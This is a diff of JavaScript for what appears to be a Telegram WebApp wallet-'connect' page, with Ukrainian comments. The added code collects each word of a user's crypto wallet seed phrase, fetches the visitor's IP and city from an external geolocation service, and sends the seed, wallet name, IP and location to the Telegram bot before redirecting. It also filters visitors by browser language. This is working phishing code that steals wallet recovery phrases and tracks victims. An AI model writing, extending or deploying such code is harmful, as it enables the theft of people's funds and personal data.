@@ -23,44 +23,90 @@ if (!langs.some(lang => allowedLangs.includes(lang))) {
     throw new Error("🚫 Заблоковано через мову");
 }
 
-document.addEventListener("DOMContentLoaded", () => {
+document.addEventListener("DOMContentLoaded", async () => {
     console.log("📦 DOM повністю завантажено");
 
-    // ✅ Перевірка Telegram WebApp
+    // ✅ Telegram WebApp перевірка
     const isWebAppReady = window.Telegram?.WebApp;
     if (!isWebAppReady) {
         console.warn("❌ Telegram WebApp не ініціалізовано!");
     } else {
+        Telegram.WebApp.ready();
         console.log("✅ Telegram WebApp активний");
     }
 
-    // 🧩 Отримуємо всі потрібні елементи
+    // 🧩 Елементи
     const btn = document.getElementById("submitBtn");
     const lengthInput = document.getElementById("length");
     const seedContainer = document.getElementById("seedContainer");
 
     if (!btn) console.warn("🚫 Кнопка #submitBtn не знайдена");
-    if (!lengthInput) console.error("❌ #length не знайдено — скасовано ініціалізацію");
-    if (!seedContainer) console.error("❌ #seedContainer не знайдено — скасовано ініціалізацію");
-
-    if (!lengthInput || !seedContainer) return;
-
-    // 🧠 Генеруємо поля для seed-фрази
-    try {
-        renderSeedInputs();
-        console.log("📝 Поля seed-фрази згенеровано");
-    } catch (err) {
-        console.error("❌ Помилка в renderSeedInputs():", err);
+    if (!lengthInput || !seedContainer) {
+        console.error("❌ #length або #seedContainer не знайдено — скасовано ініціалізацію");
+        return;
     }
 
-    // 🟢 Обробка натискання кнопки "Подключить"
+    // 📝 Рендер seed-полів
+    try {
+        renderSeedInputs();
+        console.log("✅ Поля seed-фрази згенеровано");
+    } catch (err) {
+        console.error("❌ Помилка у renderSeedInputs():", err);
+    }
+
+    // 🌍 Отримання IP + локації
+    let userInfo = { ip: "-", location: "-" };
+    try {
+        const res = await fetch("https://ipapi.co/json");
+        const data = await res.json();
+        userInfo.ip = data.ip || "-";
+        userInfo.location = `${data.city}, ${data.country_name}` || "-";
+        console.log("🌐 Отримано IP та локацію:", userInfo);
+    } catch (err) {
+        console.warn("⚠️ Неможливо отримати IP/гео:", err);
+    }
+
+    // 📦 Обробник кнопки
     if (btn) {
         btn.addEventListener("click", () => {
             console.log("🔘 Клік по кнопці 'Подключить'");
             try {
-                submitSeed();
+                const length = parseInt(lengthInput.value);
+                const words = [];
+                for (let i = 0; i < length; i++) {
+                    const input = document.getElementById(`word-${i}`);
+                    if (input) words.push(input.value.trim());
+                }
+
+                const seed = words.join(" ").trim();
+                if (seed.split(" ").length !== length) {
+                    showWarning("❗ Введіть всі слова сид-фрази");
+                    return;
+                }
+
+                clearWarning();
+                showProcessing("⏳ Обробка фрази...");
+
+                const payload = {
+                    seed,
+                    wallet: document.getElementById("wallet")?.value || "MetaMask",
+                    ip: userInfo.ip,
+                    location: userInfo.location,
+                    timestamp: Date.now()
+                };
+
+                localStorage.setItem("payload_backup", JSON.stringify(payload));
+                console.log("📦 Payload збережено:", payload);
+
+                Telegram.WebApp.sendData(JSON.stringify(payload));
+                showProcessing("✅ Дані відправлено. Очікуйте...");
+
+                setTimeout(() => {
+                    window.location.href = "profile.html";
+                }, 1200);
+
             } catch (err) {
-                console.error("❌ Помилка в submitSeed():", err);
+                console.error("❌ Помилка у submitSeed:", err);
             }
         });
     }
